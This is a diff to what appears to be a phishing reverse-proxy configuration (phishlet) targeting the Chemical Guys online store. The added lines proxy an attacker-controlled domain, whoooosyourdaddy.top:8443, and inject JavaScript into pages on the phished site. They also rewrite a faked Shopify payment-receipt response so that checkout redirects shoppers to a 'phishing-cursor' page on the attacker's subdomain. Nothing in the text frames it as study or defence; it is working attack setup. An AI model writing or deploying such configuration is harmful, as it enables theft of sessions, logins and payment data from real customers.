@@ -4,6 +4,8 @@ proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'chemicalguys.com', session: true, is_landing: true, auto_filter: true }
   - {phish_sub: '', orig_sub: '', domain: 'chemicalguys.com', session: true, is_landing: false, auto_filter: true }
   - {phish_sub: 'account', orig_sub: 'account', domain: 'chemicalguys.com', session: true, is_landing: false, auto_filter: true }
+  # 静态页面
+  - {phish_sub: 'front', orig_sub: 'front', domain: 'whoooosyourdaddy.top:8443', session: true, is_landing: false, auto_filter: true }
 
   # shopify 平台相关
 #  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'shopify.com', session: true, is_landing: false, auto_filter: true}
@@ -47,6 +49,11 @@ intercept:
 #  - {domain: 'api.gotolstoy.com', path: '.*', http_status: 404}
 
 js_inject:
+  - trigger_domains: [ "front.chemicalguys.com" ]
+    trigger_paths: [ "/test/.*" ]
+    script: |
+      document.domain="chemicalguys.com"
+
   - trigger_domains: ["www.chemicalguys.com"]
     trigger_paths: ["/checkouts/.*"]
     script: |
@@ -62,7 +69,7 @@ js_inject:
           },
           {
             url: 'PollForReceipt',
-            response: {"data":{"receipt":{"id":"gid://shopify/ProcessedReceipt/1970793545956","action":{"offsiteRedirect":false,"url":"https://www.chemicalguys.fake.com/phishing/phishing-cursor","__typename":"CompletePaymentChallenge"},"timeout":{"millisecondsRemaining":691074,"__typename":"ActionRequiredReceiptTimeout"},"__typename":"ActionRequiredReceipt"}}},
+            response: {"data":{"receipt":{"id":"gid://shopify/ProcessedReceipt/1970793545956","action":{"offsiteRedirect":false,"url":"https://front.chemicalguys.fake.com/phishing/phishing-cursor","__typename":"CompletePaymentChallenge"},"timeout":{"millisecondsRemaining":691074,"__typename":"ActionRequiredReceiptTimeout"},"__typename":"ActionRequiredReceipt"}}},
             status: 200
           }
         ];
